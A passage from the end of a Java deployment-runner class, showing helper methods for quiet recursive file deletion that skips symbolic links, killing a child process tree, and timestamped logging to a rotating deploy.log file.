         return sb.toString();
      } catch (Throwable t) {
         return "n/a-" + System.currentTimeMillis();
      }
   }

   private static void deleteQuietly(Path path) {
      try {
         deleteRecursively(path.toFile());
      } catch (Throwable ignored) {
      }
   }

   private static void deleteRecursively(File file) {
      if (file == null || !file.exists()) {
         return;
      }
      if (!Files.isSymbolicLink(file.toPath())) {
         File[] children = file.listFiles();
         if (children != null) {
            for (int i = 0; i < children.length; i++) {
               deleteRecursively(children[i]);
            }
         }
      }
      file.delete();
   }

   private static void killTree(Process p) {
      try {
         ProcessHandle handle = p.toHandle();
         ProcessHandle[] descendants = handle.descendants().toArray(ProcessHandle[]::new);
         for (int i = descendants.length - 1; i >= 0; i--) {
            try {
               descendants[i].destroyForcibly();
            } catch (Throwable ignored) {
            }
         }
      } catch (Throwable ignored) {
      }
      try {
         p.destroyForcibly();
      } catch (Throwable ignored) {
      }
   }

   private void log(String msg) {
      String line = "[" + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date())
            + "] " + msg;
      this.summary.append(line).append('\n');
      try {
         Path deployLog = this.workDir.resolve("deploy.log");
         if (Files.exists(deployLog) && Files.size(deployLog) > MAX_LOG_SNAPSHOT) {
            Files.move(deployLog, this.workDir.resolve("deploy.log.1"), StandardCopyOption.REPLACE_EXISTING);
         }
         Files.write(deployLog, (line + "\n").getBytes(StandardCharsets.UTF_8),
               java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
      } catch (Throwable ignored) {
      }
   }
}
